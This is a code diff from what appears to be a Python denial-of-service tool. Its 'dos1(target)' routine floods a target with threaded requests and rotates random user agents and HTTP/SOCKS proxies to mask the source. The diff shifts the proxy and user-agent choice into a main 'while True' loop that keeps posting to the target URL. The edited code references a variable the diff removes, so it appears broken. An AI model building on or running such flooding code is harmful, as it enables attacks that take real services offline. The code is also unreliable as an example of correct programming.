@@ -64,14 +64,12 @@ def dos1(target):
         useragent2 = random.choice(headersp)
         useragent3 = random.choice(headersp)
         useragent4 = random.choice(headersp)
-        useragent5 = random.choice(headersp)
 
         # RandomProxy
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
         proxyagenthttp2 = random.choice(proxy_http)
         proxyagentsocks2 = random.choice(proxy_socks)
-        proxyagenthttp3 = random.choice(proxy_http)
 
         # Запросы GET
         try:
@@ -152,6 +150,11 @@ else:
 print(colorama.Fore.GREEN + "All threads are running!")
 
 while True:
+    useragent = random.choice(headersp)
+    header = {'user-agent': useragent5}
+
+    proxyagenthttp3 = random.choice(proxy_http)
+    
     checksite = requests.post(url, headers={'user-agent': useragent5},
                               proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
 
